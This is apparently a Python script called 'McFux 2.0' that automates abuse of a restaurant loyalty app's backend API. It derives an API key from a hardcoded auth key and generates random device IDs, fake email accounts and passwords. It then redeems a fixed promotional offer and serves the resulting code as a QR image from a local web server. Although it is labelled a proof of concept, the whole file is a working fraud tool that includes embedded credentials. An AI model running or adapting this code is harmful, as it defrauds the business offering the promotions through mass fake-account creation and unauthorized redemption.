import requests
import string
import random
import subprocess
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer


class McFux:

	#For a random generated UUID and device
	random_uuid = ""
	random_device = ""
	#Hardcoded auth key
	auth_key = "d4eee068-272a-4aec-9681-5e16dcef6fbd"
	plexure_key = ""
	#Configuration Endpoint
	con_endpoint = "https://con-west-europe-gma.vmobapps.com/v3/"
	#Initial registered auth token
	init_token = ""
	acreg_token = ""
	#Promo code
	promo_code = ""

	#Util function
	def randomString(self, stringLength):
		letters = string.ascii_letters
		return ''.join(random.choice(letters) for i in range(stringLength))

	#I couldn't implementate it on python, so i used this "workaround", please forgive me!
	def getPlexureKey(self):
		stdoutdata = subprocess.getoutput("java McFux.java " + self.auth_key + " " + self.random_uuid)
		print("[i] Plexure API key:", stdoutdata.split()[0])
		return stdoutdata.split()[0]

	def registerDevice(self):
		headers = {
			'x-plexure-api-key' : self.plexure_key,
			'x-vmob-location_accuracy': '',
			'x-vmob-beacons': '',
			'Accept': 'application/json',
			'x-vmob-device_os_version': '',
			'x-vmob-device_type': 'a',
			'x-vmob-device': self.randomDevice,
			'x-vmob-uid' : self.random_uuid,
			'x-vmob-cost-center': 'merchantId587',
			'x-vmob-device_timezone_id': 'GMT',
			'x-vmob-device_screen_resolution': '',
			'x-vmob-mobile_operator': self.randomString(10),
			'x-vmob-location_longitude': '',
			'x-vmob-location_latitude': '',
			'x-vmob-sdk_version': '4.37.2',
			'x-vmob-device_network_type': '',
			'Accept-Language': 'it-IT',
			'x-vmob-device_utc_offset': '-0:00',
			'x-vmob-application_version': '2530',
			'Content-Type': 'application/json',
			'User-Agent': self.randomString(10),
			'Host': 'con-west-europe-gma.vmobapps.com',

			}

		data = '{"password":"' + self.randomString(20) + '","grant_type":"password","username":"'+ self.randomString(20)  + '"}'

		r = requests.post(self.con_endpoint + "DeviceRegistration", headers=headers, data=data)
		if r.status_code == 200:
			print("[i] Device Registration done, new auth token:",r.json()['access_token'])
			self.init_token = r.json()['access_token']
		else:
			print("[e] While doing device registration, Quitting.. Error:", r.text)
			quit()

	def registerAccount(self):

		headers = {
			'x-plexure-api-key' : self.plexure_key,
			'x-vmob-location_accuracy': '',
			'x-vmob-beacons': '',
			'Accept': 'application/json',
			'x-vmob-device_os_version': '',
			'x-vmob-device_type': 'a',
			'x-vmob-uid': self.random_uuid,
			'x-vmob-cost-center': 'merchantId587',
			'x-vmob-authorization': '5853342c-d3ef-421c-b23d-5c6036b8ebd5',
			'x-vmob-device_timezone_id': 'GMT',
			'x-vmob-device_screen_resolution': '',
			'x-vmob-mobile_operator': self.randomString(10),
			'Authorization': self.init_token,
			'x-vmob-device': self.randomDevice,
			'x-vmob-location_longitude': '',
			'x-vmob-location_latitude': '',
			'x-vmob-sdk_version': '4.37.2',
			'x-vmob-device_network_type': '',
			'Accept-Language': 'it-IT',
			'x-vmob-device_utc_offset': '-0:00',
			'x-vmob-application_version': '2530',
			'Content-Type': 'application/json',
			'User-Agent': self.randomString(10),
			'Host': 'con-west-europe-gma.vmobapps.com',
		}

		email = self.randomString(5) + "@" + self.randomString(5) + "." + self.randomString(2)
		password = self.randomString(5)

		data = '{"emailRegistration":{"emailAddress":"' + email + '","firstName":"' + self.randomString(5) + '","gender":"","lastName":"' + self.randomString(5) + '","password":"'+ password +'","tagValueAddReferenceCodes":["merchantId587"]},"grant_type":"password","password":"' + password + '","username":"' + email + '"}'
		r = requests.post(self.con_endpoint + 'emailRegistrations', headers=headers, data=data)
		
		if(r.status_code == 200):
			self.acreg_token = "bearer " + r.json()['access_token']
			print("[i] Got new account, new auth code:", self.acreg_token)
		else:
			print("[e] Error while getting new account, Quitting... Error:", r.text)
			quit()
		
	def getPromoCode(self, promo_id):

		headers = {
			'x-plexure-api-key': self.plexure_key,
			'x-vmob-location_accuracy': '',
			'x-vmob-beacons': '',
			'Accept': 'application/json',
			'x-vmob-device_os_version': '',
			'x-vmob-device_type': 'a',
			'x-vmob-uid': self.random_uuid,
			'x-vmob-cost-center': 'merchantId587',
			'x-vmob-authorization': '5853342c-d3ef-421c-b23d-5c6036b8ebd5',
			'x-vmob-device_timezone_id': 'GMT',
			'x-vmob-device_screen_resolution': '',
			'x-vmob-mobile_operator': self.randomString(10),
			'Authorization': self.acreg_token,
			'x-vmob-device': self.randomDevice,
			'x-vmob-location_longitude': '',
			'x-vmob-location_latitude': '',
			'x-vmob-sdk_version': '4.37.2',
			'x-vmob-device_network_type': '',
			'Accept-Language': 'it-IT',
			'x-vmob-device_utc_offset': '-0:00',
			'x-vmob-application_version': '2484',
			'Content-Type': 'application/json',
			'User-Agent': self.randomString(10),
			'Host': 'con-west-europe-gma.vmobapps.com',
		}

		data = '{"offerInstanceUniqueId":"' + str(promo_id) + '","offerId":' + str(promo_id) + '}'

		r = requests.post(self.con_endpoint + 'consumers/redeemedOffers', headers=headers, data=data)

		if r.status_code == 200:
			self.promo_code = r.json()['redemptionText']
			print("[i] Success! Promo code:", self.promo_code)
			return self.promo_code
		else:
			print("[e] Error while getting the code:", r.text)
			quit()		





	def obtainCode(self, promo_id):
		#Main method
		self.random_uuid = str(uuid.uuid4())
		print("[i] Random UUID generated:", self.random_uuid)
		self.plexure_key = self.getPlexureKey()
		self.randomDevice = self.randomString(10)
		print("[i] Random Device ID:", self.randomDevice)
		self.registerDevice()
		self.registerAccount()
		return self.getPromoCode(promo_id)




class S(BaseHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()

	def do_GET(self):
		self._set_headers()
		self.wfile.write(('<html><body><br><br><center><form action="" method="post"><input type="submit" name="getcode" value="PoC" /></form><p>McFux 2.0 // 0xF77</center></body></html>').encode())

	def do_HEAD(self):
		self._set_headers()
		
	def do_POST(self):
		# Doesn't do anything with posted data
		self._set_headers()
		promo_qr = McFux().obtainCode(15916)
		self.wfile.write(('<html><body><br><br><center><img src="https://api.qrserver.com/v1/create-qr-code/?size=300x300&ecc=L&qzone=1&data=' + promo_qr + '"></img><br><p>Promo code: ' + promo_qr  + '</p></center></body></html>').encode())



def run(server_class=HTTPServer, handler_class=S, port=8081):
	server_address = ('localhost', port)
	httpd = server_class(server_address, handler_class)
	print("[i] Starting Server on 8081..")
	httpd.serve_forever()


#generate_me = McFux()
#generate_me.obtainCode(15916)

if __name__ == '__main__':
	try:
		print("\nMcFux 2.0 // 0xf77")
		run()
	except KeyboardInterrupt:
		print("\n[i] Shutting down..")
		try:
			quit()
		except SystemExit:
			quit()


